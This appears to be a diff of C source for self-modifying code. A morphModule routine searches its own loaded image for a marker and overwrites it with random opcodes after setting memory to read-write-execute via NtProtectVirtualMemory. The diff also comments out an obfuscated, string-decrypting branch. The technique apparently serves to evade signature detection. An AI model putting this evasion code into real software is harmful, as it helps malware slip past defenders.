@@ -15,23 +15,21 @@
 
 INT morphModule() {
     INT returnValue = 1;
+// Reserved for future functionality
+//#if CONFIG_OBFUSCATION == TRUE
 
-#if CONFIG_OBFUSCATION == TRUE
+    // unsigned char s_xk[] = S_XK;
+    // unsigned char s_string[] = S_MARKER_MASK;
 
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_MARKER_MASK;
+    // unsigned char MARKER_MASK[MARKER_SIZE] = {0};
 
-    unsigned char MARKER_MASK[MARKER_SIZE] = {0};
+    //ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, MARKER_MASK, s_xk);
 
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, MARKER_MASK, s_xk);
-
-
-
-#else
+//#else
     //char * MARKER_MASK = S_MARKER_MASK;
     // Reserved for future functionality
-    char * MARKER_MASK = "xxxxxxxxxxxxxxxxxxxxxxxx";
-#endif
+    // char * MARKER_MASK = "xxxxxxxxxxxxxxxxxxxxxxxx";
+//#endif
 
     // Declare the MODULEINFO struct to store module information.
     MODULEINFO modInfo;
@@ -67,7 +65,7 @@ INT morphModule() {
 
                 // Call the findPattern function to search for the marker pattern in memory.
                 PBYTE startAddr= (PBYTE)modInfo.lpBaseOfDll;
-                pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, MARKER_MASK, MARKER_SIZE);
+                pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, NULL, MARKER_SIZE);
 
                 // If the marker pattern is found, replace it with random opcodes and update the offsets.
                 if (pbyLastMatch != NULL)
@@ -150,7 +148,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 
     // set permissions
     if((status = p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect)) != 0){
-        // _tprintf("FAILED!\n");
+        //_tprintf("FAILED! RWX\n");
         return -1;
     }
 
@@ -159,7 +157,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 
     // Restore the original memory protection
     if((status = p_NtProtectVirtualMemory(NtCurrentProcess, &pbyDst, &pbySize, dwOldProtect, &dwOldProtect)) != 0){
-        //_tprintf("FAILED\n");
+        //_tprintf("FAILED RESTORE\n");
         return -1;
     }
     //__asm("int3");
@@ -184,7 +182,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, SIZE_T uPatternSize)
 {
     SIZE_T remainingLen = uDataSize;
-
+    //_tprintf("findPattern!\n");
     while(remainingLen > 0){
         if (mem_cmp(pData, pPattern, uPatternSize) == 0) {
             return pData;
